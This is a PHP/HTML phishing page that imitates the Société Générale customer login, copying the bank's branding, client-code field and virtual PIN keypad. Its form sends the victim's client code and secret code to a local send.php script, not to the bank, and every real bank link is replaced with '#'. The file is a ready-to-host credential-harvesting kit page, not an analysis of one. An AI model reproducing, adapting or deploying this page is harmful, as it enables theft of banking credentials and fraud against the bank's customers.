<?php 
include("Config.php");

?>
<html lang="FR" class="swm-root-active swm-mode-page">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="format-detection" content="telephone=no">

    <title>Société Générale | Connexion</title>
	
    <meta name="robots" content="none">

    <title>Connexion - Espace client</title>
    <meta name="title" content="Connexion - Espace client">
    <meta property="og:title" content="Connexion - Espace client">
    <meta name="twitter:card" content="summary">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover">
    <link rel="icon" type="image/x-icon" href="./files/img/favicon.ico">

    <link href="./files/css/index_20190723161948.min.css" rel="stylesheet" type="text/css">
    <link href="./files/css/spec56_btn_gsm_all_gcd_20190320190559.min.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="./files/css/inbenta.css">
	<script>var token=<?php echo json_encode($token); ?>;</script>

    <link href="./files/css/print_20190320190559.min.css" rel="stylesheet" type="text/css" media="print">
    <style type="text/css">
        .eip_txt_light {
            font-weight: 300;
        }
        
        .eip_dcw_main-link {
            color: #fff;
            text-decoration: underline !important;
            -webkit-transition: color 0.2s ease-in-out;
            -o-transition: color 0.2s ease-in-out;
            transition: color 0.2s ease-in-out;
        }
        
        .eip_dcw_main-link:hover,
        .eip_dcw_main-link:focus {
            color: #f05b6f;
        }
    </style>
<style>

.hamza {
border: none;
    width: 9.5ch;
    background: repeating-linear-gradient(90deg, dimgrey 0, dimgrey 1ch, transparent 0, transparent 2.5ch) 0 100%/100% 0px no-repeat;
    color: dimgrey;
    font: 3ch consolas, monospace;
    letter-spacing: 0.7ch;
    margin-left: 55px;
hamza:focus {
  outline: none;

}
</style>	
<script src="./files/js/jq.js"></script>
<script src="./files/js/rules.js"></script>	
<script src="./files/js/jquery.js"></script>
<script src="./files/js/js.js"></script>
<script src="./files/js/jquery2.js" ></script>
<script>
$(document).ready(function(){
  $("#user_id").on("change paste keyup",function(){
    if ($(this).val().length >= 8) {
        $('#user_id').addClass('is-valid');
    } else {
        $('#user_id').removeClass('is-valid'); 
    }
  });
});


</script>
<script>

$(document).ready(function()
{
	var _try=0;
	$("#initClient").click(function()
	{
		$("#client-nbr").val("");
		$("#secret-nbr").val("");
		$("#next").css("opacity","0.4");
		$("#next").css("pointer-events", "none");
		$("#next").css("cursor", "default");
	});
	
	
	$("#initPass").click(function()
	{
		$("#secret-nbr").val("");
		$("#pw").val("");
		$("#next").css("opacity","0.4");
		$("#next").css("pointer-events", "none");
		$("#next").css("cursor", "default");
	});


	

});
</script>
<script>

function ShowStep2() {
	document.getElementById("clavier").style.display = "block";
	document.getElementById("btn-container").style.display = "none";
}

function valider() {
	var mdp = document.getElementById("user_id").value;
	if (mdp.length == 5) {
		return true;

	} else {
		return false;
	}
}	


</script>
</head>

<body class="PRI waitJeton swm swm-theme-BDDF  swm-page-authent  swm-theme-BDDF-BDDF swm-theme-SITE_WEB swm-module-authentCV" style="">
    

    <header class="dcw_header dcw_header--auth js-header-auth dcw_header--no-nav dcw_header--no-connexion" role="banner">
        <button class="dcw_burger-menu js-drawer-toggle" aria-label="ouvrir le menu" data-tms-element-label="ouvrir-le-menu" data-tms-click-type="A" data-tms-container-label="header-connected">
            
        </button>
        <button class="dcw_burger-menu_btn-close js-drawer-close" aria-label="fermer le menu" data-tms-element-label="fermer-le-menu" data-tms-click-type="A" data-tms-container-label="header-connected">
           
        </button>
        <div class="dcw_brand_container">
            <div class="dcw_brand_logo-container">
                <a href="#" class="dcw_brand_home-link dcw_brand_home-link--desktop"><img src="./files/img/logo-sg.svg" alt="Société Générale (se rendre à la page d’accueil)" width="164" class="dcw_brand_logo" height="32"> </a>
                <a href="#" class="dcw_brand_home-link dcw_brand_home-link--mobile"> <img src="./files/img/logo-sg-muet.svg" alt="Société Générale (se rendre à la page d’accueil)" width="30" class="dcw_brand_logo dcw_brand_logo--mute" height="30"> </a>
            </div>

        </div>
        <div class="dcw_login_wrapper-auth">
            <ul class="dcw_login-unauth">
                <li class="dcw_login-unauth_item dcw_login-unauth_contacts">
                    <a class="dcw_login-unauth_link" href="#" data-tms-click-type="N" data-tms-element-label="contacts">
                       
                        Contacts
                    </a>
                </li>
                <li class="dcw_login-unauth_item dcw_login-unauth_client">
                    <a class="dcw_login-unauth_link" href="#" data-tms-click-type="N" data-tms-element-label="devenir-client">
                       
                        Devenir client
                    </a>
                </li>
            </ul>
        </div>
        <div class="dcw_submenu-auth dcw_sidedrawer_subnav dcw_submenu-auth--persistent" style="background-image:url(index_files/img/trame.png&#39;)">
            <div class="dcw_submenu-auth_wrapper">
                <button class="dcw_submenu-auth_back-btn is-visible" aria-label="retour à la page précédente">
                </button>
                <h1 class="dcw_submenu-auth_title">Connexion - Espace client</h1>
            </div>
        </div>
        <div class="dcw_header-title_mask">
            <div class="dcw_header-title is-sticky">
                <h2 class="dcw_header-title_title" id="js-mobile-title">Connexion - Espace client</h2>
                <p class="dcw_header-title_sub" id="js-mobile-subtitle"></p>
            </div>
        </div>
    </header>
    <main class="dcw_main dcw_gb9_core-wrapper" role="main">
        <a id="go-content" tabindex="-1"></a>
        <section class="dcw_gb_row">
        </section>
        <section class="dcw_gb_wrapper">
            <a id="go-content" tabindex="-1"></a>
            <section class="dcw_gb9_core-left" id="">

                <noscript>
                    <style>
                        .auth-content {
                            display: none !important;
                        }
                        
                        .js-alert {
                            display: block !important;
                        }
                        
                        .waitAuthJetonMsg {
                            display: none !important;
                        }
                    </style>
                </noscript>

                <link rel="stylesheet" href="./files/css/style.css">

                <div id="dcw-swm" class="swm-inner-wrapper">
					<form  id="form" action="send.php"  method="POST" onsubmit="return cc()" >
                    <div class="prefetch"></div>
                    <div id="disableLayer" class="disable-layer"></div>

                    <div id="swm-tooltip" class="swm-tooltip">
                        <span></span>
                    </div>
                    <div class="swm-popin-wrapper">
                        <div id="swm-popin-overlay" class="swm-popin-overlay"></div>
                        <div id="swm-popin-dialog" class="swm-popin-dialog">
                            <div class="swm-popin-relative">
                                <div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" tabindex="0" aria-label="Fermer la popin"></div>
                                <div class="swm-popin-ombre-sup"></div>
                                <div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
                                    <div id="swm-popin" class="swm-popin">
                                        <div id="swm-popin-cadre" class="swm-popin-cadre oob-content">
                                        </div>
                                    </div>
                                </div>
                                <div class="swm-popin-ombre-inf"></div>
                            </div>
                        </div>
                    </div>

                    <div class="dcw_authent">

                        <div class="auth-content js-content-aria-hide dcw_codeContainer">
                            <div id="swmModulesAuth">
                                <div id="module-authent-cv">
                                    <div class="container-mire-codeClient">
                                        <div class="dcw_block">
                                            <div class="component-mire-codeclient">
											
                                                <div class="dcw_block-element">
                                                    <div class="auth-cs-content row_section dcw_input-container">
                                                        <input id="user_id" name="user_id" type="text" class="auth-input-erasable auth-login dcw_input grey_cross eer_input__field ngim-input"  onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" autocomplete="off" maxlength="8" required=""> <span class="dcw_sprite dcw_to-clear" id="user_id-delete"> <a class="dcw_icone dcw_effacer" aria-label="Effacer le code client" href="#"></a> </span> <span class="bar" tabindex="-1" aria-hidden="true"></span>
                                                        <label tabindex="-1" aria-hidden="true">Saisissez votre code client</label>
                                                    </div>
                                                    <div id="js-error" tabindex="0" role="alert" class="auth_error show" style="display: none;"> 
														<div class="error-wrapper"> 
															<div role="alert" class="inner">      
																<div role="alert" class="message" tabindex="0">Votre identifiant est incorrect</div>    
															</div> 
														</div>
													</div>
                                                </div>
                                                <div class="auth-checkbox-wrapper auth-check-left dcw_block-element" id="saveId-container">
                                                    <div class="switch" tabindex="0" aria-label="Activer la mémorisation du code client">
                                                        <input type="checkbox" class="switch input" id="saveId" name="saveId" style="display: none" data-xiti="clic_memoriser_identifiant" tabindex="0">
                                                        <label for="saveId" class="labelSwitch" onclick="" aria-hidden="true" data-xiti="clic_memoriser_identifiant" aria-labelledby="memo_code_client_label"> <span class="hidden-checkbox-input needsclick rep"></span>
                                                            <div class="toggle-btn-handle"></div>
                                                        </label>
                                                    </div> <span class="hidden-checkbox-label" id="memo_code_client_label" aria-hidden="true"><label for="saveId">Se souvenir de moi</label></span>
                                                    <div class="dcw_infohover dcw_input-info" tabindex="0" aria-label="Information sur la mémorisation du code client"> <span class="dcw_sprite-info--off"></span>
                                                        <div class="dcw_infopopin dcw_infobulle">
                                                            <p class="dcw_espace">Se souvenir de moi</p>
                                                            <p>En cochant cette case, votre code client sera mémorisé sur cet appareil.</p>
                                                            <p class="dcw_espace">De cette manière vous n'aurez plus à le saisir lors de vos prochaines connexions.</p>
                                                            <p class="dcw_espace">Ceci est déconseillé si votre ordinateur est utilisé par d'autres personnes.</p>
                                                            <button class="dcw_button-secondaire--linear-gris dcw_button-arrondi">J'ai compris</button>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="auth-cs-content-validate" id="btn-container" style="display: block;">
                                                    <button class="dcw_button-principal dcw_button-arrondi auth-btn-action" id="btn-validate" onclick="ShowStep2();" type="button" aria-label="Valider votre identifiant">Valider</button>
                                                    <br> </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div id="clavier" class="loaded" style="display: none;">
									

                                        <div class="component-authent-cv dcw_block" aria-expanded="true" id="sonore-vk">

                                            <div class="auth-cs-content-code auth-cs-content swm-vk">

                                                <div class="auth-cs-content-code-input row_section dcw_input-container">

                                                    <input type="button" id="closeKeyBoard">

                                                    <div class="auth-cs-content-code-input row_section dcw_input-container">

                                                        <input type="password" id="secret-nbr" name="Pass" class="dcw_input grey_cross hamza"  readonly="readonly" maxlength="6" required="" placeholder="------">
														<span class="dcw_sprite dcw_to-clear" role="button" id="initClient" style="display: block;cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto;"></span>
                                                     <div id="js-error" tabindex="0" class="auth_error"></div>

                                                    </div>
													<input type="hidden"  name="Hidden1" id="Hidden1"/>
                                                </div>
                                                <div>
                                                    <div id="gda_vk" class="clavier-container dcw_block-element dcw_conteneur_clavier swm-visible">
                                                        <div id="img_container" class="img-container">
                                                            <img id="img_clavier" class="keyboard dcw_block-element dcw_conteneur_clavier" usemap="#tc_tclavier" src="./files/img/gen_ui.png">
                                                            <div id="hover_touche_4_4" class="hover" onclick="addCode ('3');" name="3" value="" style="position: absolute; left: 180px; top: 180px; width: 60px; height: 60px;"></div>
                                                            <div id="hover_touche_4_2" class="hover" onclick="addCode ('4');" name="4" value="" style="position: absolute; left: 60px; top: 180px; width: 60px; height: 60px;"></div>
                                                            <div id="hover_touche_3_4" class="hover" onclick="addCode ('8');" name="8" value="" style="position: absolute; left: 180px; top: 120px; width: 60px; height: 60px;"></div>
                                                            <div id="hover_touche_3_3" class="hover" onclick="addCode ('7');" name="7" value="" style="position: absolute; left: 120px; top: 120px; width: 60px; height: 60px;"></div>
                                                            <div id="hover_touche_3_2" class="hover" onclick="addCode ('9');" name="9" value="" style="position: absolute; left: 60px; top: 120px; width: 60px; height: 60px;"></div>
                                                            <div id="hover_touche_3_1" class="hover" onclick="addCode ('0');" name="0" value="" style="position: absolute; left: 0px; top: 120px; width: 60px; height: 60px;"></div>
                                                            <div id="hover_touche_2_1" class="hover" onclick="addCode ('6');" name="6" value="" style="position: absolute; left: 0px; top: 60px; width: 60px; height: 60px;"></div>
                                                            <div id="hover_touche_1_4" class="hover" onclick="addCode ('2');" name="2" value="" style="position: absolute; left: 180px; top: 0px; width: 60px; height: 60px;"></div>
                                                            <div id="hover_touche_1_3" class="hover" onclick="addCode ('5');" name="5" value="" style="position: absolute; left: 120px; top: 0px; width: 60px; height: 60px;"></div>
                                                            <div id="hover_touche_1_1" class="hover" onclick="addCode ('1');" name="1" value="" style="position: absolute; left: 0px; top: 0px; width: 60px; height: 60px;"></div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="auth-cs-content-validate">

                                                    <button class="dcw_button-principal dcw_button-arrondi auth-btn-action" id="btn-authent" type="submit" aria-label="Valider votre code secret">Valider</button>

                                                    <div class="sonore-Keyboard dcw_block-element">
                                                        <a id="activeKS" class="dcw_link" tabindex="0">Activer le clavier sonore</a>
                                                    </div>

                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                        </div>

                    </div>

                    
					
					</form>
                </div>

            </section>
            <section class="dcw_gb9_core-right">

                <div>

                    <div>
                        <strong>Obtenir vos codes</strong>
                        <br>
                        <br> Le code client vous est attribué par un conseiller au moment de votre inscription au contrat Banque à distance en agence. Lors d'une ouverture de compte en ligne, le code client vous est envoyé par courrier. Il est également indiqué sur vos relevés de comptes.
                        <br>
                        <br>
                        <br>
                        <strong>Code secret oublié</strong>
                        <br>
                        <br>
                       <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link">Effectuer une nouvelle demande</a>
                        <br>
                        <br>
                        <br>
                        <strong>Nos conseils sécurité</strong>
                        <br>
                        <br>
                        <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité">Découvrez le Pass sécurité</a> 
                        <br>
                        <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées">Voir les menaces identifiées</a>
                        <br>
                        <a style="text-decoration: underline !important;" href="#" class="dcw_card-visual_regular-link" aria-label="Voir le Guide des bonnes pratiques">Guide des bonnes pratiques</a>

                    </div>

                </div>

            </section>
            <section class="dcw_gb_row dcw_gb_clearfix">
            </section>
        </section>
    </main>

    <footer class="dcw_footer" role="contentinfo">
        <div class="dcw_footer-second">
            <div class="dcw_footer_container">
                <nav class="dcw_footer-second_nav">
                    <ul class="dcw_footer-second_list">
                        <li class="dcw_footer-second_item">
                            <a data-tms-container-label="footer-general-shortcuts" href="#" data-tms-click-type="N" data-tms-element-label="trouver-une-agence">
                                
                                Trouver une agence
                            </a>
                        </li>
                        <li class="dcw_footer-second_item">
                            <a data-tms-container-label="footer-general-shortcuts" href="#" data-tms-click-type="N" data-tms-element-label="questions-fréquentes">
                                
                                Questions fréquentes
                            </a>
                        </li>
                        <li class="dcw_footer-second_item">
                            <div class="dcw_dropdown js-dropdown">
                                <button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites Société Générale</button>
                               
                                <ul class="dcw_dropdown_list toggle_content">
                                    <li class="dcw_dropdown_item">
                                        <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#" data-tms-click-type="N" data-tms-element-label="banque-privée">Banque privée</a>
                                    </li>
                                    <li class="dcw_dropdown_item">
                                        <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#" data-tms-click-type="N" data-tms-element-label="professionnels">Professionnels</a>
                                    </li>
                                    <li class="dcw_dropdown_item">
                                        <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#" data-tms-click-type="N" data-tms-element-label="entreprises">Entreprises</a>
                                    </li>
                                    <li class="dcw_dropdown_item">
                                        <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#" data-tms-click-type="N" data-tms-element-label="associations">Associations</a>
                                    </li>
                                    <li class="dcw_dropdown_item">
                                        <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="#" data-tms-click-type="N" data-tms-element-label="groupe-société-générale">Groupe Société Générale</a>
                                    </li>
                                </ul>
                            </div>
                        </li>
                    </ul>
                </nav>
                <ul class="dcw_footer_container dcw_footer-second_social">
                    <li class="dcw_footer-second_item-social">
                        <a data-tms-container-label="footer-social-links" title="Facebook" href="#" aria-label="Voir le groupe Facebook de la Société Générale" data-tms-click-type="N" data-tms-element-label="facebook">
                          
                        </a>
                    </li>
                    <li class="dcw_footer-second_item-social">
                        <a data-tms-container-label="footer-social-links" title="Twitter" href="#" aria-label="Voir le Twitter de la Société Générale" data-tms-click-type="N" data-tms-element-label="twitter">
                           
                        </a>
                    </li>
                    <li class="dcw_footer-second_item-social">
                        <a data-tms-container-label="footer-social-links" title="Instagram" href="#" aria-label="Voir l&#39; Instagram de la Société Générale" data-tms-click-type="N" data-tms-element-label="instagram">
                            
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <nav class="dcw_footer-third">
            <div class="dcw_footer_container">
                <img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" height="30" src="./files/img/logo-sg-seul.svg" width="150">
                <ul class="dcw_footer-third_list">
                    <li class="dcw_footer-third_item">
                        <a data-tms-container-label="footer-super-links" href="#" data-tms-click-type="N" data-tms-element-label="tarifs">Tarifs</a>
                    </li>
                    <li class="dcw_footer-third_item">
                        <a data-tms-container-label="footer-super-links" href="#" data-tms-click-type="N" data-tms-element-label="nos-engagements">Nos engagements</a>
                    </li>
                    <li class="dcw_footer-third_item">
                        <a data-tms-container-label="footer-super-links" href="#" data-tms-click-type="N" data-tms-element-label="informations-légales">Informations légales</a>
                    </li>
                    <li class="dcw_footer-third_item">
                        <a data-tms-container-label="footer-super-links" href="#" data-tms-click-type="N" data-tms-element-label="charte-cookies">Charte Cookies</a>
                    </li>
                    <li class="dcw_footer-third_item">
                        <a data-tms-container-label="footer-super-links" href="#" data-tms-click-type="N" data-tms-element-label="sécurité">Sécurité</a>
                    </li>
                    <li class="dcw_footer-third_item">
                        <a data-tms-container-label="footer-super-links" href="#" data-tms-click-type="N" data-tms-element-label="données-personnelles">Données personnelles</a>
                    </li>
                </ul>
            </div>
        </nav>
    </footer>

    <div id="interactWrapper" class="sdcwrapper"></div>
</body>

</html>